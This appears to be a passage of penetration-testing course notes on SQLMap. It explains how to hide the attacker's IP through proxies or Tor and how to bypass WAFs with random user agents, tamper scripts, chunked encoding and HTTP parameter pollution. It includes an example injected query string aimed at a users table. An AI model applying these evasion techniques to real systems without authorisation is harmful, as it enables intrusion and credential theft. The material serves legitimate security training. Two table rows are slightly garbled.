<p>In case we want to conceal our IP address, or if a certain web application has a protection mechanism that blacklists our current IP address, we can try to use a proxy or the anonymity network Tor. A proxy can be set with the option –proxy (e.g. –proxy=”socks4://177.39.187.70:33283”), where we should add a working proxy.</p>

<p>In addition to that, if we have a list of proxies, we can provide them to SQLMap with the option –proxy-file. This way, SQLMap will go sequentially through the list, and in case of any problems (e.g., blacklisting of IP address), it will just skip from current to the next from the list. The other option is Tor network use to provide an easy to use anonymization, where our IP can appear anywhere from a large list of Tor exit nodes. When properly installed on the local machine, there should be a SOCKS4 proxy service at the local port 9050 or 9150. By using switch –tor, SQLMap will automatically try to find the local port and use it appropriately.</p>

<p>If we wanted to be sure that Tor is properly being used, to prevent unwanted behavior, we could use the switch –check-tor. In such cases, SQLMap will connect to the https://check.torproject.org/ and check the response for the intended result (i.e., Congratulations appears inside).</p>

<h3 id="waf-bypass">WAF Bypass</h3>
<p>Whenever we run SQLMap, As part of the initial tests, SQLMap sends a predefined malicious looking payload using a non-existent parameter name (e.g. ?pfov=…) to test for the existence of a WAF (Web Application Firewall). There will be a substantial change in the response compared to the original in case of any protection between the user and the target. For example, if one of the most popular WAF solutions (ModSecurity) is implemented, there should be a 406 - Not Acceptable response after such a request.</p>

<p>In case of a positive detection, to identify the actual protection mechanism, SQLMap uses a third-party library identYwaf, containing the signatures of 80 different WAF solutions. If we wanted to skip this heuristical test altogether (i.e., to produce less noise), we can use switch –skip-waf.</p>

<h3 id="user-agent-blacklisting-bypass">User-agent Blacklisting Bypass</h3>
<p>In case of immediate problems (e.g., HTTP error code 5XX from the start) while running SQLMap, one of the first things we should think of is the potential blacklisting of the default user-agent used by SQLMap (e.g. User-agent: sqlmap/1.4.9 (http://sqlmap.org)).</p>

<p>This is trivial to bypass with the switch –random-agent, which changes the default user-agent with a randomly chosen value from a large pool of values used by browsers.</p>

<h3 id="tamper-scripts">Tamper Scripts</h3>
<p>Finally, one of the most popular mechanisms implemented in SQLMap for bypassing WAF/IPS solutions is the so-called “tamper” scripts. Tamper scripts are a special kind of (Python) scripts written for modifying requests just before being sent to the target, in most cases to bypass some protection.</p>

<p>For example, one of the most popular tamper scripts between is replacing all occurrences of greater than operator (&gt;) with NOT BETWEEN 0 AND #, and the equals operator (=) with BETWEEN # AND #. This way, many primitive protection mechanisms (focused mostly on preventing XSS attacks) are easily bypassed, at least for SQLi purposes.</p>

<p>Tamper scripts can be chained, one after another, within the –tamper option (e.g. –tamper=between,randomcase), where they are run based on their predefined priority. A priority is predefined to prevent any unwanted behavior, as some scripts modify payloads by modifying their SQL syntax (e.g. ifnull2ifisnull). In contrast, some tamper scripts do not care about the inner content (e.g. appendnullbyte).</p>

<p>Tamper scripts can modify any part of the request, although the majority change the payload content. The most notable tamper scripts are the following:</p>

<table>
  <thead>
    <tr>
      <th>Tamper-Script</th>
      <th>Description</th>
      <th> </th>
      <th> </th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>0eunion</td>
      <td>Replaces instances of UNION with e0UNION</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>base64encode</td>
      <td>Base64-encodes all characters in a given payload</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>between</td>
      <td>Replaces greater than operator (&gt;) with NOT BETWEEN 0 AND # and equals operator (=) with BETWEEN # AND #</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>commalesslimit</td>
      <td>Replaces (MySQL) instances like LIMIT M, N with LIMIT N OFFSET M counterpart</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>equaltolike</td>
      <td>Replaces all occurrences of operator equal (=) with LIKE counterpart</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>halfversionedmorekeywords</td>
      <td>Adds (MySQL) versioned comment before each keyword</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>modsecurityversioned</td>
      <td>Embraces complete query with (MySQL) versioned comment</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>modsecurityzeroversioned</td>
      <td>Embraces complete query with (MySQL) zero-versioned comment</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>percentage</td>
      <td>Adds a percentage sign (%) in front of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>plus2concat</td>
      <td>Replaces plus operator (+) with (MsSQL) function CONCAT() counterpart</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>randomcase</td>
      <td>Replaces each keyword character with random case value (e.g. SELECT -&gt; SEleCt)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>space2comment</td>
      <td>Replaces space character ( ) with comments `/</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>space2dash</td>
      <td>Replaces space character ( ) with a dash comment (–) followed by a random string and a new line (\n)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>space2hash</td>
      <td>Replaces (MySQL) instances of space character ( ) with a pound character (#) followed by a random string and a new line (\n)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>space2mssqlblank</td>
      <td>Replaces (MsSQL) instances of space character ( ) with a random blank character from a valid set of alternate characters</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>space2plus</td>
      <td>Replaces space character ( ) with plus (+)</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>space2randomblank</td>
      <td>Replaces space character ( ) with a random blank character from a valid set of alternate characters</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>symboliclogical</td>
      <td>Replaces AND and OR logical operators with their symbolic counterparts (&amp;&amp; and</td>
      <td> </td>
      <td>)</td>
    </tr>
    <tr>
      <td>versionedkeywords</td>
      <td>Encloses each non-function keyword with (MySQL) versioned comment</td>
      <td> </td>
      <td> </td>
    </tr>
    <tr>
      <td>versionedmorekeywords</td>
      <td>Encloses each keyword with (MySQL) versioned comment</td>
      <td> </td>
      <td> </td>
    </tr>
  </tbody>
</table>

<p>To get a whole list of implemented tamper scripts, along with the description as above, switch –list-tampers can be used. We can also develop custom Tamper scripts for any custom type of attack, like a second-order SQLi.</p>

<h3 id="miscellaneous-bypasses">Miscellaneous Bypasses</h3>
<p>Out of other protection bypass mechanisms, there are also two more that should be mentioned. The first one is the Chunked transfer encoding, turned on using the switch –chunked, which splits the POST request’s body into so-called “chunks.” Blacklisted SQL keywords are split between chunks in a way that the request containing them can pass unnoticed.</p>

<p>The other bypass mechanisms is the HTTP parameter pollution (HPP), where payloads are split in a similar way as in case of –chunked between different same parameter named values (e.g. ?id=1&amp;id=UNION&amp;id=SELECT&amp;id=username,password&amp;id=FROM&amp;id=users…), which are concatenated by the target platform if supporting it (e.g. ASP).</p>

      </section>
    </div>
  </body>
</html>
